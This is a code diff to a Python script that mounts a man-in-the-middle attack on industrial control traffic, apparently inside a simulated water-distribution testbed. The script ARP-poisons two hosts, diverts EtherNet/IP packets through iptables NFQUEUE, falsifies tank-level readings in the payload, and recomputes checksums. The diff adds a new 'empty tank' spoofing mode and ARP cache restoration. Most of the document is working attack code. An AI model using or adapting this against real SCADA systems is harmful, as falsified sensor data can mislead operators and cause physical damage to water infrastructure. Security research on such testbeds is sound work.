@@ -25,7 +25,6 @@ sniffed_packet = []
 injection_phase = 0
 
 # The attack on SCADA is an integrity attack on T_LVL
-spoof_phase = 0
 spoof_counter = 0
 
 spoof_attack_counter = 0
@@ -36,8 +35,21 @@ spoof_offset = 2.5
 attack_on = 0
 
 
+def network_empty_tank_1(raw, value):
+    # todo: Decide on a way to pass a function or list of values
+    print ("empty tank 1-----------")
+    float_value = translate_load_to_float(raw)
+    fake_value = float_value + float(value.strip())
+    c.execute("UPDATE ctown SET value = 1 WHERE name = 'ATT_1'")
+    conn.commit()
+    pay = translate_float_to_load(fake_value, raw[0], raw[1])
+    return pay
+
+
+
 def spoof_value(raw):
-    print ("Spoofing-----------")
+    # todo: Decide if safe to delete
+    print("Spoofing-----------")
     float_value = translate_load_to_float(raw)
     fake_value = float_value + spoof_offset
     c.execute("UPDATE ctown SET value = 3 WHERE name = 'ATT_1'")
@@ -63,45 +75,25 @@ def capture(packet):
     if len(pkt) == 102:
         print("Capturing...")
         raw = pkt[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
-        if sys.argv[3] == "empty_tank_1":
-            if sys.argv[1] == '192.168.1.1':
-                pay = spoof_value(raw)
+
+        # Check attack name on attack_description.yaml to decide which method to launch
+        if sys.argv[3] == "network_empty_tank_1":
+                pay = network_empty_tank_1(raw, sys.argv[4])
                 pkt[Raw].load = pay  # Replace the tank level with the spoofed one
                 del pkt[TCP].chksum  # Needed to recalculate the checksum
                 packet.set_payload(str(pkt))
 
+                # This value is written by physical_process.py
                 rows = c.execute("SELECT value FROM ctown WHERE name = 'ATT_2'").fetchall()
                 conn.commit()
                 attack_on = int(rows[0][0])
 
+                # We add this delay to simulate the attacker running another process
+                time.sleep(0.01)
                 if attack_on == 0:
                     print("Attack finished")
                     c.execute("UPDATE ctown SET value = 0 WHERE name = 'ATT_1'")
                     conn.commit()
-                    global spoof_phase
-                    spoof_phase = 0
-                    __setdown(enip_port)
-                    return 0
-
-        if sys.argv[3] == "exponential_offset":
-            if sys.argv[1] == '192.168.1.1':
-                pay = exponential_spoof(raw)
-                pkt[Raw].load = pay  # Replace the tank level with the spoofed one
-                del pkt[TCP].chksum  # Needed to recalculate the checksum
-                packet.set_payload(str(pkt))
-                rows = c.execute("SELECT value FROM ctown WHERE name = 'ATT_2'").fetchall()
-                conn.commit()
-                attack_on = int(rows[0][0])
-
-                global spoof_attack_counter
-                spoof_attack_counter += 1
-
-                if attack_on == 0:
-                    c.execute("UPDATE ctown SET value = 0 WHERE name = 'ATT_1'")
-                    conn.commit()
-                    print("Attack finished")
-                    global spoof_phase
-                    spoof_phase = 0
                     __setdown(enip_port)
                     return 0
 
@@ -118,12 +110,13 @@ def translate_load_to_float(raw_load):
 def translate_float_to_load(fv, header0, header1):
     un = hex(struct.unpack('<I', struct.pack('<f', fv))[0])  # Convert to hex again
     to_proces = un[2:].decode("hex")  # Decode as string
-    pay = header0 + header1 + to_proces[-1] + to_proces[-2] + to_proces[-3] + to_proces[0]  # Re arrange for endianness. This is a string
+    pay = header0 + header1 + to_proces[-1] + to_proces[-2] + to_proces[-3] + to_proces[0]
+    # Re arrange for endianness. This is a string
     return pay
 
 def start():
-    __setup(enip_port)
     nfqueue.bind(0, capture)
+    __setup(enip_port)
     try:
         print("[*] Starting water level spoofing")
         nfqueue.run()
@@ -135,7 +128,8 @@ def start():
 
 def __setup(port):
 
-    cmd = 'iptables -t mangle -A PREROUTING -p tcp --sport ' + str(port) + ' -j NFQUEUE'
+    cmd = 'iptables -t mangle -A PREROUTING -m mac --mac-source 00:00:00:00:00:07 ' \
+          '-p tcp --sport ' + str(port) + ' -j NFQUEUE'
     os.system(cmd)
 
     cmd = 'iptables -A FORWARD -p icmp -j DROP'
@@ -150,13 +144,22 @@ def __setup(port):
     launch_arp_poison()
 
 def __setdown(port):
-    cmd = 'sudo iptables -t mangle -D PREROUTING -p tcp --sport ' + str(port) + ' -j NFQUEUE'
+    restore_arp()
+    cmd = 'iptables -t mangle -D PREROUTING  -m mac --mac-source 00:00:00:00:00:07 ' \
+          '-p tcp --sport ' + str(port) + ' -j NFQUEUE'
     os.system(cmd)
 
+    cmd = 'iptables -D FORWARD -p icmp -j DROP'
+    os.system(cmd)
+
+    cmd = 'iptables -D INPUT -p icmp -j DROP'
+    os.system(cmd)
+
+    cmd = 'iptables -D OUTPUT -p icmp -j DROP'
+    os.system(cmd)
     nfqueue.unbind()
     print("[*] Stopping water level spoofing")
-    c.execute("UPDATE ctown SET value = 0 WHERE name = 'ATT_1'")
-    conn.commit()
+
 
 def launch_arp_poison():
     targetip = sys.argv[2]
@@ -165,15 +168,11 @@ def launch_arp_poison():
     print("[*] Launching arp poison sourceip: " + sys.argv[1])
     print("[*] Launching arp poison targetip: " + sys.argv[2])
 
-    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
-    targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
+    targetmac = get_mac(targetip)
+    print("[*] Target MAC: " + str(targetmac))
 
-    print("[*] Targetmac: " + str(targetmac))
-
-    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=sourceip)
-    response = srp(arppacket, timeout=2, verbose=False)
-    print(str(response))
-    sourcemac = response[0][0][1].hwsrc
+    sourcemac = get_mac(sourceip)
+    print("[*] Source MAC: " + str(sourcemac))
 
     spoof_arp_cache(sourceip, sourcemac, targetip)
     spoof_arp_cache(targetip, targetmac, sourceip)
@@ -182,6 +181,23 @@ def launch_arp_poison():
 def spoof_arp_cache(targetip, targetmac, sourceip):
     spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
     send(spoofed, verbose=False)
+
+def get_mac(an_ip):
+    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=an_ip)
+    targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
+    return targetmac
+
+def restore_arp():
+    targetip = sys.argv[2]
+    sourceip = sys.argv[1]
+    target_mac = get_mac(targetip)
+    source_mac = get_mac(sourceip)
+
+    packet = ARP(op=2, pdst=targetip, hwdst=target_mac, psrc=sourceip, hwsrc=source_mac)
+    send(packet, verbose=False)
+
+    packet = ARP(op=2, pdst=sourceip, hwdst=source_mac, psrc=targetip, hwsrc=target_mac)
+    send(packet, verbose=False)
 
 def prepare_network():
     subprocess.call(['route', 'add', 'default', 'gw', '192.168.1.254'], shell=False)
